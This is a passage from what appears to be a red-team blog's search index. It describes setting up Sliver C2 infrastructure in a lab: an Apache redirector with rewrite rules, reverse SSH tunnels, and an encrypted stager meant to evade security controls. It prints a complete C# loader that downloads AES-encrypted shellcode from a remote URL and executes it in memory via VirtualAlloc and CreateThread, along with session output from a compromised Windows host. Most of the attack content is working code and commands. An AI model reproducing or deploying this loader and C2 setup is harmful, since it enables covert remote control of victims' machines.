class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># generate key pairs.</span></span><br><span class="line">operator-0@redirector-0:~$ openssl req -new -newkey rsa:4096 -x509 -sha256 -days 365 -nodes -out public.crt -keyout private.key</span><br><span class="line">...+..+...+.+......+...+...+...+..+.......+...+..+.+.....+......+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*.+...+...........+.+..+.........................+......+.....+....+..+.+.....+....+...+..+...................+.....+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*...........+..+................+........................+.........+......+......+.....+...........................+...+.............+.....+.+........+......+.......+...+.....+.......+..+............+.+........+....+......+.........+...+..+.......+.....+...+.+..+....+...............+.......................+.+.........+..+...+......+....+...............+...............+.......................+...+.........+.+...........+....+.....+.......+..+.......+......+............+.....+...+....+...+..+....+..+...+....+.....+.+......+..............+..........+........................+..+.+............+.....+...+............................+.....................+.....+....+...........+..........+......+...+..+.........+.+.........+...+...............+...+..+.+.........+...+...............+.....+...+......+.........+....+...........+......+...+.......+...+.....+......+..........+..+...+..........+......+......+..+...............+...+....+.....+.............+..+...............+...+......+.......+...+.....+......+.+..+.+........................+..+.+.........+.....+...................+...........+..................+.+..+.......+.....................+..+...+......+.............+..+....+...........+...+.+..+............+...+...............+....+...+.....+.......+...........+.......+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line">.....+.........+......+......+..+...+.......+...+..+.......+........+.+.....+.......+.....+.......+..+....+..+...+......+....+......+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*.....+.........+..................+...+......+...+.+.........+.....+......+.......+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*.+......+......+.................+...+.........+.+...........................+..+...+...........................+.+...+...........+.............+...+..............+...............+......+.........+...+...+...+....+.....+...............+......+......+..........+...+.....+......+...............+......+....+.....................+......+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line">-----</span><br><span class="line">You are about to be asked to enter information that will be incorporated</span><br><span class="line">into your certificate request.</span><br><span class="line">What you are about to enter is what is called a Distinguished Name or a DN.</span><br><span class="line">There are quite a few fields but you can leave some blank</span><br><span class="line">For some fields there will be a default value,</span><br><span class="line">If you enter <span class="string">&#x27;.&#x27;</span>, the field will be left blank.</span><br><span class="line">-----</span><br><span class="line">Country Name (2 letter code) [AU]:EG</span><br><span class="line">State or Province Name (full name) [Some-State]:Cairo</span><br><span class="line">Locality Name (eg, city) []:</span><br><span class="line">Organization Name (eg, company) [Internet Widgits Pty Ltd]:Fake Corp</span><br><span class="line">Organizational Unit Name (eg, section) []:</span><br><span class="line">Common Name (e.g. server FQDN or YOUR name) []:fake-host.com</span><br><span class="line">Email Address []:</span><br></pre></td></tr></table></figure><ol><li><p>These two steps are only required if we have a valid public server.</p></li><li><p>Mainly, it opt for a new signed certificate using certbot.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">operator-0@redirector-0:~$ openssl req -new -key private.key -out fake-host.csr</span><br><span class="line">operator-0@redirector-0:~$ certbot certonly -d fake-host.com --apache --register-unsafely-without-email --agree-tos</span><br></pre></td></tr></table></figure></li></ol></li><li><p>As, we are working on a lab, we will just use the early generated keys.</p></li><li><p>Add the keys to Apache configurations.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># copy keys to the setup locations.</span></span><br><span class="line">operator-0@redirector-0:~$ sudo <span class="built_in">cp</span> public.crt /etc/ssl/certs/</span><br><span class="line">operator-0@redirector-0:~$ sudo <span class="built_in">cp</span> private.key /etc/ssl/private/</span><br><span class="line"></span><br><span class="line"><span class="comment"># edit Apache config</span></span><br><span class="line">operator-0@redirector-0:~$ nano /etc/apache2/sites-enabled/default-ssl.conf </span><br><span class="line"></span><br><span class="line"><span class="comment"># edit keys entries to refer to the generated keys.</span></span><br><span class="line">operator-0@redirector-0:~$ grep -oE <span class="string">&quot;SSLCertificate[K]?[e]?[y]?File.*/.*&quot;</span> /etc/apache2/sites-enabled/default-ssl.conf</span><br><span class="line">SSLCertificateFile/etc/ssl/certs/public.crt</span><br><span class="line">SSLCertificateKeyFile/etc/ssl/private/private.key</span><br><span class="line"></span><br><span class="line"><span class="comment"># disable peer certificate check - c2 server listener self signed certificate.</span></span><br><span class="line">operator-0@redirector-0:~$ grep <span class="string">&quot;SSLProxyCheckPeerCN&quot;</span> /etc/apache2/sites-enabled/default-ssl.conf</span><br><span class="line">                SSLProxyCheckPeerCN off</span><br><span class="line"></span><br><span class="line"><span class="comment"># restart Apache to reflect the new configurarions.</span></span><br><span class="line">operator-0@redirector-0:~$ sudo systemctl restart apache2.service </span><br></pre></td></tr></table></figure></li><li><p>Check the added certificate.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">operator-0@redirector-0:~$ curl --insecure -vvI https://192.168.24.138 2&gt;&amp;1 | awk <span class="string">&#x27;BEGIN &#123; cert=0 &#125; /^\* SSL connection/ &#123; cert=1 &#125; /^\*/ &#123; if (cert) print &#125;&#x27;</span></span><br><span class="line">* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384</span><br><span class="line">* ALPN, server accepted to use http/1.1</span><br><span class="line">* Server certificate:</span><br><span class="line">*  subject: C=EG; ST=Cairo; O=Fake Corp; CN=fake-host.com</span><br><span class="line">*  start <span class="built_in">date</span>: Jan 28 00:12:00 2023 GMT</span><br><span class="line">*  expire <span class="built_in">date</span>: Jan 28 00:12:00 2024 GMT</span><br><span class="line">*  issuer: C=EG; ST=Cairo; O=Fake Corp; CN=fake-host.com</span><br><span class="line">*  SSL certificate verify result: self-signed certificate (18), continuing anyway.</span><br><span class="line">* TLSv1.2 (OUT), TLS header, Supplemental data (23):</span><br><span class="line">* TLSv1.2 (IN), TLS header, Supplemental data (23):</span><br><span class="line">* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):</span><br><span class="line">* TLSv1.2 (IN), TLS header, Supplemental data (23):</span><br><span class="line">* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):</span><br><span class="line">* old SSL session ID is stale, removing</span><br><span class="line">* TLSv1.2 (IN), TLS header, Supplemental data (23):</span><br><span class="line">* Mark bundle as not supporting multiuse</span><br><span class="line">* Connection <span class="comment">#0 to host 192.168.24.138 left intact</span></span><br></pre></td></tr></table></figure></li><li><p>Enable htaccess, which can be used for traffic redirection.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">operator-0@redirector-0:~$ <span class="built_in">tail</span> -n 10 /etc/apache2/sites-enabled/default-ssl.conf</span><br><span class="line">        <span class="comment"># Enable htaccess </span></span><br><span class="line">&lt;Directory /var/www/html/&gt;</span><br><span class="line"> Options Indexes FollowSymLinks MultiViews</span><br><span class="line"> AllowOverride All</span><br><span class="line">             Require all granted</span><br><span class="line">        &lt;/Directory&gt;</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span></span><br></pre></td></tr></table></figure></li><li><p>Enable reverse proxy.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">operator-0@redirector-0:~$ sudo nano /etc/apache2/sites-enabled/default-ssl.conf</span><br><span class="line">operator-0@redirector-0:~$ <span class="built_in">head</span> -n 35 /etc/apache2/sites-enabled/default-ssl.conf | <span class="built_in">tail</span> -n 10</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># Enable reverse proxy over ssl                </span></span><br><span class="line">                SSLProxyEngine on</span><br><span class="line">                </span><br><span class="line">                SSLProxyCheckPeerCN off</span><br><span class="line"><span class="comment">#   A self-signed (snakeoil) certificate can be created by installing</span></span><br><span class="line"><span class="comment">#   the ssl-cert package. See</span></span><br><span class="line"><span class="comment">#   /usr/share/doc/apache2/README.Debian.gz for more info.</span></span><br><span class="line"><span class="comment">#   If both key and certificate are stored in the same file, only the</span></span><br><span class="line"><span class="comment">#   SSLCertificateFile directive is needed.</span></span><br><span class="line">operator-0@redirector-0:~$ sudo systemctl restart apache2</span><br></pre></td></tr></table></figure></li><li><p>Since redirector shouldn’t have direct access to our team server, the connection should be done through reverse SSH tunnel from the team server.</p></li><li><p>There should be two rules as follow.</p><ol><li>One rule used to download the payload using a stager, this was mainly configured in Sliver C2 by sending a request URI that ends with “.woff”.</li><li>Another rule used in session establishment and termination which should serve HTTP requests that has URI which ends with one of js, html, php, and png.</li></ol></li><li><p>Add Apache redirect rules.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">operator-0@redirector-0:~$ <span class="built_in">cat</span> /var/www/html/.htaccess</span><br><span class="line">RewriteEngine on</span><br><span class="line"></span><br><span class="line">RewriteCond %&#123;REQUEST_URI&#125; <span class="string">&quot;.*\.(js|html|php|png)$&quot;</span></span><br><span class="line">RewriteRule .* https://localhost:9443%&#123;REQUEST_URI&#125; [P]</span><br><span class="line"></span><br><span class="line">RewriteCond %&#123;REQUEST_URI&#125; <span class="string">&quot;.*\.woff$&quot;</span></span><br><span class="line">RewriteRule .* https://localhost:8443%&#123;REQUEST_URI&#125; [P]</span><br></pre></td></tr></table></figure></li></ol><h2 id="SSH-tunnel-from-C2-server-to-redirector-machine"><a href="#SSH-tunnel-from-C2-server-to-redirector-machine" class="headerlink" title="SSH tunnel from C2 server to redirector machine"></a>SSH tunnel from C2 server to redirector machine</h2><p>Since the redirector should only reach the team server over reverse SSH tunnle, let’s open two reverse tunnle serving our stager and sessions.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(kali~🔥~kali)-[~]$ ssh -N -R 8443:localhost:8443 -i operator-0 operator-0@192.168.24.138</span><br><span class="line">Warning: Identity file operator-0 not accessible: No such file or directory.</span><br><span class="line">operator-0@192.168.24.138<span class="string">&#x27;s password:</span></span><br></pre></td></tr></table></figure><p>On another terminal.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(kali~🔥~kali)-[~]$ ssh -N -R 9443:localhost:443 -i operator-0 operator-0@192.168.24.138 </span><br><span class="line">Warning: Identity file operator-0 not accessible: No such file or directory.</span><br><span class="line">operator-0@192.168.24.138<span class="string">&#x27;s password: </span></span><br></pre></td></tr></table></figure><h2 id="Team-Server-Sliver-C2"><a href="#Team-Server-Sliver-C2" class="headerlink" title="Team Server - Sliver C2"></a>Team Server - Sliver C2</h2><ol><li><p>Now, I won’t give too much about Sliver c2, the setup should be pretty much similar to any C2 tool, and there is a quite good kick starter on its github page.</p></li><li><p>First, let’s create a new profile to server for the stager.</p></li><li><p>The profile should point to the redirector IP address as it will be the victim facing target.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sliver &gt; <span class="comment"># profiles new --http  &lt;redirector IP&gt; --skip-symbols --format shellcode --arch amd64 win64</span></span><br><span class="line">sliver &gt; profiles new --http  192.168.24.138 --skip-symbols --format shellcode --<span class="built_in">arch</span> amd64 win64</span><br><span class="line"></span><br><span class="line">[*] Saved new implant profile win64</span><br></pre></td></tr></table></figure></li><li><p>We will use our https listener, so we can add the same certificate we used in redirector to keep everything consistent.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># we will use </span></span><br><span class="line">sliver &gt; https --cert ./public.pem --key ./private.pem</span><br><span class="line"></span><br><span class="line">[*] Starting HTTPS :443 listener ...</span><br><span class="line"></span><br><span class="line">[*] Successfully started job <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">sliver &gt; <span class="built_in">jobs</span> </span><br><span class="line"></span><br><span class="line"> ID   Name    Protocol   Port </span><br><span class="line">==== ======= ========== ======</span><br><span class="line"> 2    https   tcp        443  </span><br></pre></td></tr></table></figure></li><li><p>We will create a stager that also listens on https, it is prefered to be compressed and encrypted to be small in size and to potentially evade inline security controls.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sliver &gt; <span class="comment"># keep the IP of stager pointing to the C2, but change it on the stager agent to point to the redirector.</span></span><br><span class="line">sliver &gt; stage-listener --url https://192.168.24.128:8443 --profile win64  --compress gzip --aes-encrypt-key D(G+KbPeShVmYq3t6v9y<span class="variable">$B</span>&amp;E)H@McQfT --aes-encrypt-iv 8y/B?E(G+KbPeShV</span><br><span class="line"></span><br><span class="line">[*] No builds found <span class="keyword">for</span> profile win64, generating a new one</span><br><span class="line">[*] Job 9 (http) started</span><br><span class="line">[*] AES KEY: D(G+KbPeShVmYq3t6v9y<span class="variable">$B</span>&amp;E)H@McQfT</span><br><span class="line">[*] AES IV: 8y/B?E(G+KbPeShV</span><br></pre></td></tr></table></figure></li></ol><h2 id="Getting-Shell"><a href="#Getting-Shell" class="headerlink" title="Getting Shell"></a>Getting Shell</h2><ol><li><p>As everything should be ready by now, we will compile then run the below stager targetting the redirector IP for the “test.woff” file.</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.IO.Compression;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"><span class="keyword">using</span> System.Security.Cryptography;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Sliver_stager</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">string</span> AESKey = <span class="string">&quot;D(G+KbPeShVmYq3t6v9y$B&amp;E)H@McQfT&quot;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">string</span> AESIV = <span class="string">&quot;8y/B?E(G+KbPeShV&quot;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">string</span> url = <span class="string">&quot;https://192.168.24.138/test.woff&quot;</span>;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">DllImport(<span class="string">&quot;kernel32.dll&quot;</span>, SetLastError = true, ExactSpelling = true)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">VirtualAlloc</span>(<span class="params">IntPtr lpAddress, <span class="built_in">uint</span> dwSize, <span class="built_in">uint</span> flAllocationType, <span class="built_in">uint</span> flProtect</span>)</span>;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">DllImport(<span class="string">&quot;kernel32.dll&quot;</span>)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">CreateThread</span>(<span class="params">IntPtr lpThreadAttributes, <span class="built_in">uint</span> dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, <span class="built_in">uint</span> dwCreationFlags, IntPtr lpThreadId</span>)</span>;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">DllImport(<span class="string">&quot;kernel32.dll&quot;</span>)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">WaitForSingleObject</span>(<span class="params">IntPtr hHandle, UInt32 dwMilliseconds</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">DownloadAndExecute</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) =&gt; <span class="literal">true</span>;</span><br><span class="line">            System.Net.WebClient client = <span class="keyword">new</span> System.Net.WebClient();</span><br><span class="line">            <span class="built_in">byte</span>[] shellcode = client.DownloadData(url);</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            <span class="comment">//byte[] actual = null;</span></span><br><span class="line"></span><br><span class="line">            List&lt;<span class="built_in">byte</span>&gt; l = <span class="keyword">new</span> List&lt;<span class="built_in">byte</span>&gt; &#123; &#125;;   </span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">16</span>; i &lt;= shellcode.Length <span class="number">-1</span>; i++) &#123;</span><br><span class="line">                l.Add(shellcode[i]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">byte</span>[] actual = l.ToArray();</span><br><span class="line"></span><br><span class="line">            <span class="built_in">byte</span>[] decrypted;</span><br><span class="line"></span><br><span class="line">            Console.WriteLine(shellcode.Length);</span><br><span class="line">            Console.WriteLine(l.Count);</span><br><span class="line">            Console.WriteLine(actual.Length);</span><br><span class="line"></span><br><span class="line">            decrypted = Decrypt(actual, AESKey, AESIV);</span><br><span class="line">            IntPtr addr = VirtualAlloc(IntPtr.Zero, (<span class="built_in">uint</span>)decrypted.Length, <span class="number">0x3000</span>, <span class="number">0x40</span>);</span><br><span class="line">            Marshal.Copy(decrypted, <span class="number">0</span>, addr, decrypted.Length);</span><br><span class="line">            IntPtr hThread = CreateThread(IntPtr.Zero, <span class="number">0</span>, addr, IntPtr.Zero, <span class="number">0</span>, IntPtr.Zero);</span><br><span class="line">            WaitForSingleObject(hThread, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">Decompress</span>(<span class="params"><span class="built_in">byte</span>[] bytes</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">using</span> (<span class="keyword">var</span> memoryStream = <span class="keyword">new</span> MemoryStream(bytes))</span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">using</span> (<span class="keyword">var</span> outputStream = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">using</span> (<span class="keyword">var</span> decompressStream = <span class="keyword">new</span> GZipStream(memoryStream, CompressionMode.Decompress))</span><br><span class="line">                    &#123;</span><br><span class="line">                        decompressStream.CopyTo(outputStream);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> outputStream.ToArray();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">Decrypt</span>(<span class="params"><span class="built_in">byte</span>[] ciphertext, <span class="built_in">string</span> AESKey, <span class="built_in">string</span> AESIV</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">byte</span>[] key = Encoding.UTF8.GetBytes(AESKey);</span><br><span class="line">            <span class="built_in">byte</span>[] IV = Encoding.UTF8.GetBytes(AESIV);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">using</span> (Aes aesAlg = Aes.Create())</span><br><span class="line">            &#123;</span><br><span class="line">                aesAlg.Key = key;</span><br><span class="line">                aesAlg.IV = IV;</span><br><span class="line">                aesAlg.Padding = PaddingMode.None;</span><br><span class="line"></span><br><span class="line">                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">using</span> (MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream(ciphertext))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">using</span> (CryptoStream cryptoStream = <span class="keyword">new</span> CryptoStream(memoryStream, decryptor, CryptoStreamMode.Write))</span><br><span class="line">                    &#123;</span><br><span class="line">                        cryptoStream.Write(ciphertext, <span class="number">0</span>, ciphertext.Length);</span><br><span class="line">                        <span class="keyword">return</span> Decompress(memoryStream.ToArray());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params">String[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            DownloadAndExecute();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Session should be established pointing to both the redirector and the victim target IPs.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">sliver (CLEAR_METHOD) &gt; sessions </span><br><span class="line"></span><br><span class="line"> ID         Name           Transport   Remote Address                              Hostname   Username                     Operating System   Locale   Last Message                               Health </span><br><span class="line">========== ============== =========== =========================================== ========== ============================ ================== ======== ========================================== ========</span><br><span class="line"> 14e3b4ba   CLEAR_METHOD   http(s)     tcp(192.168.24.138:36434)-&gt;192.168.24.135   commando   COMMANDO\Mostafa.Noureldin   windows/amd64      en-US    Sat Jan 28 19:50:03 EST 2023 (7m53s ago)   [DEAD] </span><br><span class="line"></span><br><span class="line">sliver (CLEAR_METHOD) &gt; info</span><br><span class="line"></span><br><span class="line">        Session ID: 3d730b7b-3ab1-41ba-845b-620c4d52588c</span><br><span class="line">              Name: COLOURED_EXIT</span><br><span class="line">          Hostname: commando</span><br><span class="line">              UUID: 96724d56-78cb-ee26-2d12-efbe4931b42d</span><br><span class="line">          Username: COMMANDO\Mostafa.Noureldin</span><br><span class="line">               UID: S-1-5-21-3124759866-2301652251-578080113-1000</span><br><span class="line">               GID: S-1-5-21-3124759866-2301652251-578080113-513</span><br><span class="line">               PID: 6352</span><br><span class="line">                OS: windows</span><br><span class="line">           Version: 10 build 19044 x86_64</span><br><span class="line">            Locale: en-US</span><br><span class="line">              Arch: amd64</span><br><span class="line">         Active C2: https://192.168.24.138</span><br><span class="line">    Remote Address: tcp([::1]:36154)-&gt;192.168.24.135</span><br><span class="line">         Proxy URL: </span><br><span class="line">Reconnect Interval: 1m0s</span><br><span class="line">     First Contact: Mon Jan 30 17:27:53 EST 2023 (26s ago)</span><br><span class="line">      Last Checkin: Mon Jan 30 17:28:14 EST 2023 (5s ago)</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> red team </category>
          
          <category> infrastructure </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Sliver </tag>
            
            <tag> c2 </tag>
            
            <tag> team server </tag>
            
            <tag> apache </tag>
            
            <tag> redirector </tag>
            
            <tag> ssh tunnel </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>about</title>
      <link href="https://mmnoureldin.github.io/Red-Team/about/index.html"/>
      <url>https://mmnoureldin.github.io/Red-Team/about/index.html</url>
      
        <content type="html"><![CDATA[<p>Just another hacking blog !</p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>Categories</title>
      <link href="https://mmnoureldin.github.io/Red-Team/categories/index.html"/>
      <url>https://mmnoureldin.github.io/Red-Team/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>Tags</title>
      <link href="https://mmnoureldin.github.io/Red-Team/tags/index.html"/>
      <url>https://mmnoureldin.github.io/Red-Team/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
